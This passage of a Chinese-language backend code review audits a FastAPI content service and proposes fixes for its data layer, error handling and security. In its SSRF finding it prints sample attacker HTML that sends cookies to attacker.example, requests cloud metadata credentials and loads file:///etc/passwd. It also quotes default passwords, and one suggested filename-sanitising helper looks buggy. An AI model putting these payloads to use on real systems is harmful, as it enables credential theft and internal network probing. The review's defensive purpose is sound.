---
doc_id: QA-REV-002
title: ContentHub 后端代码质量与架构审查附页
category: QA
domain: REV
status: active
version: 1.0
author: zhoudabo
created_at: 2026-09-24
updated_at: 2026-10-27
tags: [代码审查, 后端, 架构]
---

# ContentHub Backend 代码质量与架构审查报告

审查对象：`_analysis_ContentHub/backend`（FastAPI + SQLAlchemy 2.0 + PostgreSQL + MinIO + Playwright + edge-tts）
规模：应用代码 ~1500 行（`app/`），测试 ~1900 行，4 个 Alembic 迁移。
审查方式：全量阅读 `app/`、`alembic/`、`scripts/`、`tests/`、`pyproject.toml`、`Dockerfile`、`docker-compose.yml`。

严重级别定义：**高** = 会导致线上故障 / 数据丢失 / 安全事件；**中** = 明显缺陷或性能/维护性债，需排期；**低** = 风格与健壮性改进。

---

## 1. 架构与分层

### 1.1【高】`assets.py` 是典型 fat router：624 行、9 个端点、承担上传/事务/渲染/TTS/压缩包/LLM 六类职责

`app/routers/assets.py` 全文件 624 行，是第二大模块（`models.py` 190 行）的 3 倍。路由层同时做了：

- HTTP 适配（`:148-155` 表单解析）
- 领域状态机判定（`:247-253` 读 `ZONE_TRANSITIONS`）
- 血缘规则（`:311-316` `ALLOWED_DERIVATION_ZONES`、`:422-427`）
- 存储编排 + 临时文件 + 进程调用（`:73-131` `store_upload`）
- 事务管理（`:170-182`、`:348-364`、`:395-411`、`:502-510`、`:612-620` 各写一遍 `flush/commit/refresh`）
- 渲染管线（`:468-493`）
- Jinja2 模板变量计算（`:485-487` 三个魔法数）
- TTS + SRT + zip 打包（`:588-605`）
- LLM 调用与异常映射（`:534-543`）

**没有 service 层**：`app/` 下只有 `routers/`，无 `services/`、无 repository。

**可执行改法**（分两步，不要一次性重构）：

第一步——先在 `assets.py` 内部抽出 3 个纯函数，消掉重复，风险最低：

```python
# app/routers/assets.py 顶部
def _persist_derived(db: Session, *, source: Asset, title: str, file_name: str,
                     ct: str, zone: AssetZone, status: AssetStatus,
                     text: str | None, attrs: dict, object_key: str | None,
                     recipe_ref: str | None = None, note: str | None = None,
                     meta: dict | None = None) -> Asset:
    """统一『建资产 + 存对象键 + 记血缘 + 提交』，供 5 个派生端点复用。"""
    asset = Asset(zone=zone, status=status, title=title, file_name=file_name,
                  content_type=ct, text_content=text, object_key=object_key,
                  created_by=source.created_by, meta=meta or {})
    db.add(asset)
    db.flush()
    db.add(Derivation(source_asset_id=source.id, derived_asset_id=asset.id,
                      recipe_ref=recipe_ref, note=note, created_by=source.created_by))
    db.commit()
    db.refresh(asset)
    return asset


def _detail(asset: Asset, storage=None) -> AssetDetail:
    """统一 AssetDetail 组装（含预签名 URL），替代 5 处重复的 upstream/downstream 拼装。"""
    detail = AssetDetail.model_validate(asset)
    detail.upstream = [DerivationOut.model_validate(d) for d in asset.upstream]
    detail.downstream = [DerivationOut.model_validate(d) for d in asset.downstream]
    if asset.object_key and storage is not None:
        detail.file_url = storage.presigned_get(asset.zone.value, asset.object_key)
    return detail
```

第二步——迁到 service 层：`app/services/asset_service.py`（领域 + 事务）、`app/services/render_service.py`（Playwright）、`app/services/tts_service.py`（edge-tts）。路由只留 `Depends` 注入 + 权限 + 调用。

### 1.2【中】`store_upload` 把传输层类型（`UploadFile`）与领域逻辑耦死在路由模块里

`assets.py:73-131`，签名 `async def store_upload(storage, zone, key, file: UploadFile, content_type)`。测试为了强制走大文件分支，不得不 `monkeypatch.setattr(assets_mod, "INLINE_TEXT_LIMIT", 8)`（`tests/test_assets_api.py:215`）——这正是耦合的症状。

**改法**：定义 `@dataclass UploadedBlob: filename, content_type, size, read_head(), stream()`，service 只依赖该协议，路由负责把 `UploadFile` 适配成它。

### 1.3【中】importer 反向依赖 router，形成层级倒置

`app/importer/obsidian.py:69`：

```python
def content_type_for(name: str) -> str:
    from ..routers.assets import EXT_CONTENT_TYPE   # ← 数据导入器依赖 Web 路由层
```

**改法**：把 `EXT_CONTENT_TYPE` / `content_type_for` 提升到 `app/media_types.py`（无框架依赖），`routers/assets.py:53-70` 与 `importer` 同时 import 它。测试里 `tests/test_assets_api.py` 无需改动。

### 1.4【中】派生端点缺少 zone 守卫，与新引入的状态机语义不一致

- `derive_text_for_master`（`assets.py:517-525`）：只校验 `master.text_content` 非空，**不校验 zone**。source 区、甚至 publish 区的资产都能当"母版"派生。
- `derive_video_kit_for_master`（`assets.py:570-582`）：同样只校验正文非空。
- 对照 `render_cover_for_master`（`assets.py:459-461`）也只校验 `content_type == "image"`，同样不校验 zone。

`derive_from_master`（`:381-382`）和 `create_initial_draft`（`:333-336`）却严格校验。同类端点规则不一，是 bug 温床。

**改法**：

```python
def _require_zone(asset: Asset, *zones: AssetZone) -> None:
    if asset.zone not in zones:
        raise HTTPException(
            422, f"当前 zone={asset.zone.value}，仅 {'/'.join(z.value for z in zones)} 可执行此操作")

# derive-text / derive-video-kit / render-cover 开头统一：
_require_zone(master, AssetZone.MASTER)
```

### 1.5【低】`ASSET.Status` 词表 `ZONE_STATUSES` 是死代码

`app/models.py:40-53` 定义了 `ZONE_STATUSES`，但 `app/` 内 **零引用**（仅 `tests/test_models.py:18-21` 断言它）。真正的校验只走 `ZONE_TRANSITIONS`（`assets.py:247`），于是"某 zone 允许哪些状态"实际未被执行——`create_external`（`:186-199`）直接写死 `AssetStatus.AVAILABLE`，`create_asset` 走 `INITIAL_STATUS[zone]`。

**改法**：要么在 `INITIAL_STATUS` 查表前加断言 `assert INITIAL_STATUS[zone] in ZONE_STATUSES[zone]`（顺带挡住 `KeyError` → 500），要么删掉 `ZONE_STATUSES` 及对应测试，避免"看起来有约束其实没有"。

### 1.6【低】`INITIAL_STATUS[zone]` 是裸字典索引，缺键即 500

`assets.py:164`：`status=INITIAL_STATUS[zone]`。目前靠 `:156-159` 提前拒绝 `PUBLISH` 才安全；一旦有人重排代码或新增 zone，直接 `KeyError` → 500。

**改法**：`INITIAL_STATUS.get(zone)`，取不到时 `raise HTTPException(422, ...)`。

---

## 2. 数据层

### 2.1【高】列表接口把整篇正文塞进响应：50 × 50MB

`app/schemas.py:41-59` 的 `AssetOut` 含 `text_content: str | None`（`:52`），而 `list_assets`（`assets.py:202-228`）用默认 `limit=50`（`:208`）返回 `list[AssetOut]`。上传链路对 ≤50MB 的 markdown/docx 会写入完整正文（`assets.py:86-89`、`INLINE_TEXT_LIMIT = 50 * 1024**2` 于 `:51`）。

即：一次 `GET /api/assets?zone=master` 最坏返回 **2.5GB JSON**，且每篇正文在网络层全量序列化。前端列表页只需要标题和元数据。

**改法**：拆 DTO。

```python
class AssetListItem(BaseModel):
    """列表项：不含正文，仅供列表/看板使用。"""
    model_config = ConfigDict(from_attributes=True)
    id: uuid.UUID
    zone: AssetZone
    status: AssetStatus
    title: str
    content_type: str
    file_name: str | None = None
    published_url: str | None = None
    updated_at: datetime
    meta: dict
    text_excerpt: str | None = None   # 可选：由 SQL 侧截断

# assets.py
@router.get("", response_model=list[AssetListItem])
def list_assets(...): ...
```

若前端确实需要摘要，用 SQL 侧截断而非拉全量：

```python
stmt = select(Asset, func.left(Asset.text_content, 200).label("text_excerpt"))
```

### 2.2【高】外键列无索引，`derivations.derived_asset_id` 查询全表扫

`app/models.py:138-162` 的 `Derivation` 只有主键和 `uq_derivation_pair(source_asset_id, derived_asset_id)`（`:140-142`）。PostgreSQL **不会**为外键创建索引。复合唯一约束的前导列 `source_asset_id` 可被复用，但 `derived_asset_id` 无索引 —— 而 `Asset.upstream` 正以 `foreign_keys="Derivation.derived_asset_id"` 查询（`models.py:123-128`）。

后果：每次 `get_asset` 的 `asset.upstream` 懒加载（`assets.py:236`）都是 `derivations` 全表扫描。

**改法**：新增迁移。

```python
# alembic/versions/<rev>_add_hot_indexes.py
def upgrade() -> None:
    op.create_index("ix_derivations_derived_asset_id", "derivations", ["derived_asset_id"])
    op.create_index("ix_assets_zone_status_updated_at", "assets",
                    ["zone", "status", "updated_at"], postgresql_using="btree")
    op.create_index("ix_assets_content_type", "assets", ["content_type"])

def downgrade() -> None:
    op.drop_index("ix_assets_content_type", table_name="assets")
    op.drop_index("ix_assets_zone_status_updated_at", table_name="assets")
    op.drop_index("ix_derivations_derived_asset_id", table_name="derivations")
```

### 2.3【高】事务跨越网络/磁盘长任务，把连接池钉死

`assets.py:170-182`：

```python
db.add(asset)
db.flush()                                    # ← 事务已开，连接已占用
key = f"{asset.id}/{file_name}"
try:
    text, attrs = await store_upload(...)      # ← 最长 2GB 上传 + ffprobe 120s + Pillow
except HTTPException:
    db.rollback()
    raise
...
db.commit()
```

同一模式复制在 `:348-364`（initial-draft）、`:395-411`（derive）、`:502-510`（render-cover）、`:612-620`（video-kit，还叠加 edge-tts 网络调用）。

`app/db.py:11` 未设置 `pool_size`，默认 `QueuePool(size=5, max_overflow=10)`。并发 16 个上传即触发 `QueuePool limit of size 5 overflow 10 reached` → 请求超时。同时 `db.flush()`/`db.commit()` 是同步阻塞调用，却在 `async def` 里执行（见 5.1）。

**改法**：先在事务内只写元数据、拿到 ID，`commit` 释放连接，再上传，最后回填 `object_key`（乐观/补偿）：

```python
asset = Asset(...)
db.add(asset)
db.commit()                       # 立刻释放连接与锁
db.refresh(asset)
key = f"{asset.id}/{file_name}"
try:
    text, attrs = await store_upload(storage, zone, key, file, ct)
except Exception:
    db.delete(asset); db.commit()   # 补偿：删掉半成品行
    raise
asset.object_key, asset.text_content, asset.meta = key, text, _merged(asset, attrs)
db.commit()
```

并把上传放进 `run_in_threadpool`（见 5.1）。

### 2.4【中】存储写入成功但 `commit` 失败 → 孤儿对象，无补偿

`assets.py:477-509`（render-cover）与 `:601-619`（video-kit）是 "先 `storage.put` 再 `db.commit()`"：

```python
storage.put(AssetZone.PUBLISH, key, png, "image/png")   # :505
pub.object_key = key
db.add(Derivation(...))
db.commit()                                             # :509 若失败，png 成孤儿
```

`assets.py:96`（小文件）与 `:114`（流式）同理：先落盘，之后 `commit` 无 try/except。DB 唯一键冲突、连接断开、`file_name` 超 500 字符（`models.py:102`）等都会留下无主对象。项目已有 `scripts/cleanup_orphans.py` 兜底，但那是事后扫描。

**改法**：`try: db.commit() except Exception: storage.delete(zone, key); raise`，或统一走 2.3 的"先提交元数据、后落对象、最后回填"顺序，并让 `object_key` 为空的行可被孤儿清理识别。

### 2.5【中】`delete_asset` 先删对象后删行，是单向不可恢复

`assets.py:301-308`：

```python
asset = get_asset_or_404(db, asset_id)
if asset.object_key:
    storage.delete(asset.zone.value, asset.object_key)   # :306 先删对象
db.delete(asset)
db.commit()                                              # :308 若失败 → 行还在、对象已没
```

`db.delete` + `commit` 失败（如 FK 未加 CASCADE 的路径、死锁）时行保留但对象键悬空，后续 `presigned_get`（`:239`）返回 404 而非报错，表现为"资产在列表里但打不开"。

**改法**：DB 优先，对象删除改为提交后的 best-effort 并记录：

```python
key, zone = asset.object_key, asset.zone.value
db.delete(asset)
db.commit()
if key:
    try:
        storage.delete(zone, key)
    except Exception:
        logger.warning("对象删除失败，待 cleanup_orphans 回收 zone=%s key=%s", zone, key, exc_info=True)
```

### 2.6【中】JSONB 未启用 `MutableDict`，依赖"必须整体赋值"的隐性约定

`models.py:110`、`:183` 是裸 `JSONB`。`patch_asset_attrs`（`assets.py:265-268`）恰好遵守了"赋新 dict"的约定并留了注释，但这是纸糊的：

```python
meta = dict(asset.meta or {})
meta["attrs"] = media_attrs.merge_attrs(dict(meta.get("attrs") or {}), body.attrs)
asset.meta = meta          # 赋新 dict 触发 JSONB 变更检测  ← 一旦有人写 asset.meta["x"]=1 就静默丢失
```

**改法**：

```python
from sqlalchemy.dialects.postgresql import JSONB
from sqlalchemy.ext.mutable import MutableDict

meta: Mapped[dict] = mapped_column(MutableDict.as_mutable(JSONB), default=dict, server_default="{}")
```

### 2.7【中】`list_assets` 无总数，无法真正分页；`list_recipes` 完全无分页

- `assets.py:202-228`：有 `limit/offset`（`:208-209`）但响应是裸 `list[AssetOut]`，没有 `total`，前端无法渲染页码/判断是否到底。
- `recipes.py:42-47`：`select(Recipe)` 无 `limit`，返回全表。模板数量增长后无界。

**改法**：定义 `Page[T]` 泛型响应并在 `list_assets` 返回 `items + total + limit + offset`；`list_recipes` 加 `limit: int = Query(50, ge=1, le=200)` 与 `offset`。

### 2.8【中】搜索条件不转义 `%`/`_`，且 `ORDER BY updated_at` 无索引

`assets.py:223-227`：

```python
if q:
    like = f"%{q}%"
    stmt = stmt.where(Asset.title.ilike(like) | Asset.text_content.ilike(like))
```

- `q="%"` → `ilike '%%%'` 命中全表；`q="a_b"` 的 `_` 变成任意字符通配。非注入（参数化没问题），但语义错误、易被用来打满查询。
- 排序 `Asset.updated_at.desc()`（`:212`）无索引；叠加 zone/status 过滤后必然 sort。

**改法**：

```python
def _escape_like(s: str) -> str:
    return s.replace("\\", "\\\\").replace("%", r"\%").replace("_", r"\_")

if q:
    like = f"%{_escape_like(q)}%"
    stmt = stmt.where(Asset.title.ilike(like, escape="\\")
                      | Asset.text_content.ilike(like, escape="\\"))
```

配合 2.2 的 `ix_assets_zone_status_updated_at`。

### 2.9【中】迁移与模型的一致性：结构性对齐，但验证机制缺失

逐条核对结果：

| 项 | models.py | 迁移 | 一致 |
|---|---|---|---|
| `assets.zone` 枚举值 | source/topic/master/publish `:16-20` | `e56a46be8006:27`(source/master/publish) + `c3d9f1a02b47:26`(add topic) | ✅ |
| `assets.status` 枚举值 | available/candidate/researching/approved/shelved/topic/drafting/finalized/publishing/published `:23-36` | `e56a46be8006:28` + `c3d9f1a02b47:27-31` | ✅ |
| `source_path` unique | `unique=True` `:107` | `UniqueConstraint('source_path')` `e56a46be8006:42` | ✅ |
| trgm 索引 | `:78-89` | `e56a46be8006:44-45` | ✅ |
| `meta` server_default | `"{}"` `:110`,`:183` | `server_default='{}'` | ✅ |
| timestamptz | `DateTime(timezone=True)` `:112-117`, `:157-159`, `:185-189` | `2d5364b7040d:39-46`, `a98ff6f65060:24` | ✅ |
| `recipes` | `:170-189` | `2d5364b7040d:24-36` | ✅ |

**无漂移**。但三个隐患：

1. `alembic/env.py:31` 未开 `compare_type=True`，`context.configure(connection=connection, target_metadata=target_metadata)` —— 未来 `alembic revision --autogenerate` **检测不到列类型变更**（这正是 `a98ff6f65060` 需要手写的原因）。改：加 `compare_type=True, compare_server_default=True`。
2. `alembic/env.py` 未设 `naming_convention`，`app/db.py:7-8` 的 `Base` 也没有 `metadata = MetaData(naming_convention=...)` → 自动生成的约束名随环境变化，跨库 diff 困难。
3. 测试完全不跑迁移（见 7.2）。`c3d9f1a02b47` 是手写的、带 `autocommit_block` 的枚举 + 数据迁移（`:25-40`），恰恰是最需要验证、却零覆盖的一类代码。

### 2.10【低】`assets` 无 `zone` 单列索引，`meta`/`text_content` 无大小约束

列表查询固定按 `Asset.zone`（`:213`）过滤，`meta.py:32-34` 的 stats 也按 `zone,status` 分组。低频但可加（已并入 2.2）。`AttrsPatch.attrs`（`schemas.py:101`）与 `AssetExternalCreate.meta`（`:84`）都是无深度/无大小限制的任意 dict，可写入巨型 JSONB。

---

## 3. 正确性与健壮性

### 3.1【高】`spec` 校验存在未捕获的 `TypeError` → 500（已确认可复现路径）

`app/routers/assets.py:468-474`：

```python
try:
    spec_dict = spec_for(platform, json.loads(spec) if spec else None)
except (json.JSONDecodeError, ValueError, KeyError) as exc:
    raise HTTPException(422, f"spec 非法：...")
```

`app/cover_specs.py:36-39`：

```python
def spec_for(platform: str, override: dict | None = None) -> dict[str, int]:
    base = dict(COVER_SPECS[platform])
    if override:
        base.update({k: int(v) for k, v in override.items() if k in ("width", "height")})
    return base
```

- `spec='{"width": {}}'` → `int({})` 抛 **`TypeError`**，不在捕获列表 → 500 Internal Server Error。
- `spec='["a"]'` → `override.items()` 抛 **`AttributeError`**，同样 500。
- `spec='{"width": "abc"}'` → `ValueError`，被正确转 422（因此现有测试 `test_render_cover_api.py:116-123` 只覆盖了合法失败路径，漏掉这两种）。

**改法**：用 Pydantic 解析而非手工 `json.loads`：

```python
# app/schemas.py
class CoverSpec(BaseModel):
    width: int | None = Field(None, ge=64, le=8192)
    height: int | None = Field(None, ge=64, le=8192)

# app/routers/assets.py
try:
    raw = json.loads(spec) if spec else None
    override = CoverSpec.model_validate(raw).model_dump(exclude_none=True) if raw else None
    spec_dict = spec_for(platform, override)
except (json.JSONDecodeError, ValidationError, ValueError, KeyError, TypeError) as exc:
    raise HTTPException(422, f"spec 非法：{exc}") from exc
```

### 3.2【高】`spec` 无上限，可让 Chromium 分配巨型位图（DoS）

`spec` 覆盖值直接进 `viewport`（`assets.py:489` → `rendering.py:24-27`），且 `device_scale_factor=2`（`rendering.py:26`）。`spec='{"width":50000,"height":50000}'` → 50000×50000×2²×4B ≈ **80GB** 位图请求。当前 `spec_for`（`cover_specs.py:39`）只做 `int(v)`，**无任何范围校验**。

**改法**：如上 `CoverSpec` 的 `ge=64, le=8192`，并在 `spec_for` 内二次钳制（纵深防御）：

```python
MAX_DIM, MIN_DIM = 8192, 64
for k, v in override.items():
    if k in ("width", "height"):
        iv = int(v)
        if not MIN_DIM <= iv <= MAX_DIM:
            raise ValueError(f"{k} 须在 [{MIN_DIM}, {MAX_DIM}]，收到 {iv}")
        base[k] = iv
```

### 3.3【高】无统一异常处理、无日志，500 完全不可观测

全仓 **零 `logging`**（`grep -rn "logging\|logger" app/` 无结果）。错误响应三种形态并存：

- `HTTPException` → `{"detail": "中文文案"}`（`assets.py:143`、`:250` 等）
- Pydantic 校验失败 → FastAPI 默认 `{"detail": [ {...} ]}` 结构完全不同
- 未捕获异常 → 纯文本 `Internal Server Error`，无 body、无 traceback 落盘、无请求 ID

后果：3.1 的 500、`llm.py:44` 的 `KeyError`、MinIO 抖动、`ffprobe` 缺失全部**静默消失**——运维只能靠用户截图。

**改法**（性价比最高的单条改动）：

```python
# app/main.py
import logging, uuid
from fastapi import Request
from fastapi.responses import JSONResponse

logging.basicConfig(
    level=logging.INFO,
    format='{"ts":"%(asctime)s","lvl":"%(levelname)s","logger":"%(name)s","msg":%(message)s}',
)
logger = logging.getLogger("contenthub")

@app.middleware("http")
async def add_request_id(request: Request, call_next):
    rid = request.headers.get("x-request-id") or uuid.uuid4().hex[:12]
    request.state.request_id = rid
    resp = await call_next(request)
    resp.headers["x-request-id"] = rid
    return resp

@app.exception_handler(Exception)
async def unhandled(request: Request, exc: Exception):
    rid = getattr(request.state, "request_id", "-")
    logger.exception("未处理异常 rid=%s path=%s", rid, request.url.path)
    return JSONResponse(status_code=500,
                        content={"detail": "服务器内部错误", "request_id": rid})
```

### 3.4【中】`llm.py` 对上游响应结构无防御，`KeyError` 直接 500

`app/llm.py:43-44`：

```python
resp.raise_for_status()
return resp.json()["choices"][0]["message"]["content"]
```

上游返回限流 JSON、`content: null`、`choices: []` 时依次抛 `KeyError`/`IndexError`/`TypeError`。`assets.py:534-543` 只捕获 `LLMNotConfigured`、`HTTPStatusError`、`TransportError`，这些结构错误**穿透成 500**。另外 `json.JSONDecodeError`（非 JSON 响应，如网关 HTML 502 页）同样未捕获。

**改法**：

```python
def complete(self, system: str, user: str) -> str:
    resp = httpx.post(self.url, headers={...}, json={...}, timeout=self.timeout)
    resp.raise_for_status()
    try:
        data = resp.json()
        content = data["choices"][0]["message"]["content"]
    except (ValueError, KeyError, IndexError, TypeError) as exc:
        raise LLMBadResponse(
            f"上游响应结构异常：{resp.text[:200]!r}") from exc
    if not isinstance(content, str) or not content.strip():
        raise LLMBadResponse("上游返回空内容")
    return content
```

并在路由捕获 `LLMBadResponse → 502`。

### 3.5【中】LLM 提示词无长度上限，50MB 正文可直灌上游

`assets.py:530-533` 把 `master.text_content` 全量注入 `system`，而正文上限是 50MB（`:51`）。这会命中上游 413/上下文超限，浪费配额，并让 `derive-text` 请求耗时以分钟计。

**改法**：

```python
MAX_PROMPT_CHARS = 60_000
body = master.text_content
if len(body) > MAX_PROMPT_CHARS:
    raise HTTPException(422, f"母版正文 {len(body)} 字超过提示词上限 {MAX_PROMPT_CHARS}，请先精简")
```

### 3.6【中】上传体积检查在"已写满磁盘"之后，413 形同虚设

`assets.py:85-112`：

```python
data = await file.read(INLINE_TEXT_LIMIT + 1)
if len(data) <= INLINE_TEXT_LIMIT: ...        # ≤50MB 分支：无任何上限检查（还好）
with tempfile.SpooledTemporaryFile(max_size=64 * 1024 * 1024) as tmp:
    tmp.write(data)
    shutil.copyfileobj(file.file, tmp)        # 先把整个 body 落盘
    size = tmp.tell()
    if size > MAX_UPLOAD_BYTES:               # :111 才拒绝
        raise HTTPException(413, ...)
```

更关键的是：Starlette 在**进入 handler 之前**就把整个 multipart 落到 spooled 临时文件（未配置 `max_part_size` / `MAX_UPLOAD` 中间件），所以 `assets.py:111` 的 413 只挡住"再复制一份"，磁盘占用早已发生。100GB body 会先占满磁盘。

**改法**：在 ASGI 层前置拦截。

```python
# app/main.py
MAX_BODY = 2 * 1024**3
@app.middleware("http")
async def limit_body(request: Request, call_next):
    cl = request.headers.get("content-length")
    if cl and int(cl) > MAX_BODY:
        return JSONResponse(413, {"detail": f"请求体超过上限 {MAX_BODY} 字节"})
    return await call_next(request)
```

同时给 `python-multipart` 设上限（Starlette 层 `request.form(max_part_size=...)` 或反向代理 `client_max_body_size`）。

### 3.7【中】`file_name` 未净化：超长导致 commit 失败，含分隔符污染对象键

`assets.py:160`，`:172`：

```python
file_name = file.filename or "untitled"
...
key = f"{asset.id}/{file_name}"
```

- `models.py:102` 是 `String(500)`。客户端给 600 字符文件名 → `db.commit()` 抛 `DataError` → 500，且对象已落盘成孤儿（见 2.4）。
- `file_name` 可含 `/`、`..`，直接拼进对象键。MinIO 键不是文件系统路径，**不构成目录穿越**，但会破坏 `scripts/cleanup_orphans.py:28-33` 依赖的"`{asset.id}/` 前缀即归属"约定，也让 `:479` 的 `Path(master.file_name).suffix` 出现意外值。
- `file_name` 里的 `"`/换行会进入 `Content-Disposition` 等下游（当前未直接构造，属潜在）。

**改法**：

```python
from pathlib import PurePosixPath
import re, unicodedata

def safe_file_name(raw: str | None, fallback: str = "untitled") -> str:
    name = unicodedata.normalize("NFC", (raw or "").strip())
    name = PurePosixPath(name).name          # 丢掉任何目录成分
    name = re.sub(r'[\x00-\x1f\x7f/\\:*?"<>|]', "_", name)
    stem = "".join([name.rsplit(".", 1)[0][:180], ".", name.rsplit(".", 1)[-1][:32]])
    return stem if name and ". ".strip() != stem else fallback
```

（更简单可靠：`key = f"{asset.id}/blob{Path(name).suffix}"`，原文件名只存 DB。）

### 3.8【中】存储对象的 `Content-Type` 直接取客户端声明

`assets.py:96`、`:115`：

```python
storage.put(zone, key, data, file.content_type or "application/octet-stream")
storage.put_stream(zone, key, tmp, size, file.content_type or "application/octet-stream")
```

域内类型由 `content_type_for(file_name)`（`:68-70`）推断（可信），但落对象时用的是**客户端可控**的 `file.content_type`。上传 HTML/JS 并声明 `text/html` 后，若对象通过同源或预设域名直出，即成为存储型 XSS 载体。

**改法**：使用服务端推断的 MIME。

```python
SERVER_MIME = {".md": "text/markdown", ".docx": "application/vnd...wordprocessingml.document",
               ".png": "image/png", ".jpg": "image/jpeg", ...}
def mime_for(file_name: str) -> str:
    return SERVER_MIME.get("." + file_name.rsplit(".", 1)[-1].lower(), "application/octet-stream")
```

并在 `presigned_get` 响应上强制 `Content-Disposition: attachment`（MinIO 侧 `response-content-disposition` 参数）。

### 3.9【低】静默吞异常处无日志

- `media_attrs.py:28`、`:80`、`:141`：三处 `except Exception: return None/{})`。失败隔离是**正确设计**（`test_media_attrs.py:97-104` 有意守护），但一笔日志都不留，ffprobe 未安装会表现为"所有视频都没有属性"却无人知晓。**改法**：`logger.debug("图片属性抽取失败", exc_info=True)`。
- `assets.py:128`：probe 副本失败静默吞掉。同上加日志。
- `speech.py:46`：捕获后重试，最后一次 re-raise（`:50`），行为正确，但中间失败未记录。加 `logger.warning("TTS 第 %d 次失败: %s", attempt+1, exc)`。

### 3.10【低】`obsidian.parse_frontmatter` 是手写 YAML，嵌套/多行结构静默降级

`importer/obsidian.py:43-52`：跳过以 `-`/空格/`\t` 开头的行，`partition(":")` 切分。对 `tags: [a, b]` 返回字符串 `"[a, b]"`，对 `description: |` 多行块丢失后续行，对 `title: "a: b"` 恰好能对。作为 M0 导入器可接受，但元数据会静默错。

**改法**：`pyyaml` 已是常见依赖之外的选择——直接加 `PyYAML`（`yaml.safe_load`），或在 docstring 明确"仅支持单行标量"，并加 `# TODO` 与测试覆盖多行场景。

### 3.11【低】`link_derivation` 的 `created_by` 丢失

`assets.py:436-437`：`Derivation(source_asset_id=..., derived_asset_id=..., recipe_ref=..., note=...)` 未传 `created_by`，落 `models.py:155` 的默认 `"zhoudabo"`，而其它派生路径都用 `master.created_by`。`DerivationCreate`（`schemas.py:118-121`）也没有该字段。多用户场景下血缘审计错人。

**改法**：`created_by=derived.created_by`（与 `ALLOWED_DERIVATION_ZONES` 校验放在同一处）。

---

## 4. 安全

### 4.1【高】全站零认证授权：任何人都能删资产、改模板、触发渲染

`grep -rn "OAuth2\|HTTPBearer\|Security\|api_key_header\|Depends(.*auth" app/` 零命中。`app/main.py:1-13` 无中间件、无 `dependencies=`，`app/routers/*.py` 无任何鉴权依赖。

`docker-compose.yml` 还把 api 直接发布到宿主机：

```yaml
ports:
  - "8001:8000"     # docker-compose.yml: api.services.ports
```

即任何能访问该端口/所在网段的人可以：

- `DELETE /api/assets/{id}`（`assets.py:301`）——**不可逆删除资产与对象**
- `POST /api/recipes`（`recipes.py:22`）——写入任意 Jinja2 模板（见 4.2）
- `DELETE /api/recipes/{id}`、`PATCH /api/assets/{id}/status`
- 通过 `GET /api/assets`（`:202`）读取全部正文与元数据
- 触发 `render-cover` / `derive-video-kit` / `derive-text` 消耗 Playwright / TTS / LLM 配额（成本 DoS）

**改法**（最小可用版本，1 个文件）：

```python
# app/security.py
import hmac
from fastapi import Header, HTTPException, status
from .config import settings

async def require_api_key(x_api_key: str = Header(...)) -> str:
    if not settings.api_key:
        raise HTTPException(503, "服务端未配置 CH_API_KEY，拒绝所有写操作")
    if not hmac.compare_digest(x_api_key, settings.api_key):
        raise HTTPException(status.HTTP_401_UNAUTHORIZED, "无效 API Key")
    return "authenticated"

# app/routers/assets.py
@router.delete("/{asset_id}", status_code=204, dependencies=[Depends(require_api_key)])
def delete_asset(...): ...
```

读接口可先保持开放（内网），但**写接口与所有触发外部资源消耗的端点必须先上锁**。中期再引入用户体系与按 `created_by` 的归属校验。

### 4.2【高】用户可定义模板 × Chromium 渲染 = SSRF / 本地文件探测 / 内网横向

`recipes.py:22-39` 允许任意人 `POST` 一个 `COVER_TEMPLATE`（已确认无鉴权）。`render_cover_for_master`（`assets.py:481-489`）把该模板渲染成 HTML，写入临时目录后用 Playwright 以 `file://` 打开（`rendering.py:18-28`）：

```python
html_path = Path(tmp) / "cover.html"
html_path.write_text(html_text, encoding="utf-8")
...
page.goto(html_path.as_uri())     # :28 file:///tmp/xxxx/cover.html
```

`SandboxedEnvironment`（`rendering.py:8`）挡住了 Jinja2 侧的 SSTI（这是正确的选择，值得肯定），但**模板本身就是 HTML/JS**，沙箱对此无能为力。攻击者可提交：

```html
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<img src="http://minio:9000/contenthub-publish/...">
<script>new Image().src="https://attacker.example/?leak="+document.cookie</script>
<iframe src="file:///etc/passwd">
```

Chromium 从 `file://` 页面发起的外部请求构成**服务器侧 SSRF**（可探测云元数据、内网 MinIO/Postgres 端口、用响应时间做端口扫描）；`file://` 子资源引用则可能读取本机文件并渲染进截图或外发。

**改法**（三层，前两层必做）：

1. **锁定模板来源**：`COVER_TEMPLATE` 的创建/修改仅限管理员（见 4.1 的 `require_api_key` + 角色），产品侧不再让前端自由提交 HTML。
2. **渲染时断网 + 禁 file 协议**：

```python
# rendering.py
def screenshot(html_text: str, width: int, height: int) -> bytes:
    from playwright.sync_api import sync_playwright
    with tempfile.TemporaryDirectory() as tmp:
        html_path = Path(tmp) / "cover.html"
        html_path.write_text(html_text, encoding="utf-8")
        with sync_playwright() as p:
            browser = p.chromium.launch(args=["--disable-file-system"])  # 禁 file 读取
            try:
                ctx = browser.new_context(viewport={"width": width, "height": height},
                                          device_scale_factor=2,
                                          offline=True)          # 断网 → 杜绝 SSRF
                ctx.route("**/*", lambda route: route.abort())   # 兜底：拦截一切网络请求
                page = ctx.new_page()
                page.goto(html_path.as_uri())
                page.wait_for_timeout(200)
                return page.screenshot(type="png")
            finally:
                browser.close()
```

注意 `offline=True` 会同时阻断字体/图片的远程加载，模板作者需内联资源（当前 `seed_recipes.py:16` 的 `url('file://{{ image_file }}')` 是本地文件，需要与 `route` 白名单配合，仅放行 `file://` 且限定临时目录前缀）。
3. **出口网络策略**：容器加 `--network` 隔离或 iptables 阻断到 `169.254.0.0/16`、`10/8`、`172.16/12`、`192.168/16`。

### 4.3【高】密钥硬编码为默认值，且未做启动校验

`app/config.py:5-14`：

```python
database_url: str = "postgresql+psycopg://contenthub:contenthub@localhost:5433/contenthub"
minio_access_key: str = "contenthub"
minio_secret_key: str = "contenthub123"
llm_api_key: str = ""
```

同一组密码又明文出现在 `docker-compose.yml`（`MINIO_ROOT_PASSWORD: contenthub123`、`CH_MINIO_SECRET_KEY: contenthub123`）。默认值即"能用的生产配置"，一旦忘配 `.env`（仓库里确实不存在 `backend/.env`，但 compose 用 `env_file: - backend/.env` 强制要求），服务会带着公开凭据静默启动。

**改法**：

```python
# app/config.py
from pydantic import Field, ValidationError, model_validator

class Settings(BaseSettings):
    environment: str = "dev"                     # dev | prod
    database_url: str                            # 无默认值 → 缺失即启动失败
    minio_endpoint: str
    minio_access_key: str
    minio_secret_key: str
    api_key: str = ""
    # ...

    @model_validator(mode="after")
    def _check(self):
        if self.environment == "prod":
